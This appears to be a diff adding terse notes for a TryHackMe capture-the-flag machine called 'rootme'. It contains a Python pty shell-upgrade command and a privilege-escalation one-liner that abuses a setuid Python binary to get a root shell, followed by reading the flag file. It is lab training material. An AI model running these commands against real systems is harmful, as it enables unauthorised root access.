@@ -1,0 +1,24 @@
+
+
+
+
+
+Be the user
+============================================================================================================
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+
+Privlege Escalation
+============================================================================================================
+www-data@rootme:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@rootme:/$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
+# id
+uid=0(root) gid=33(www-data) groups=33(www-data)
+
+Find the flag
+============================================================================================================
+# cat /root/root.txt
+THM{REDACTED}
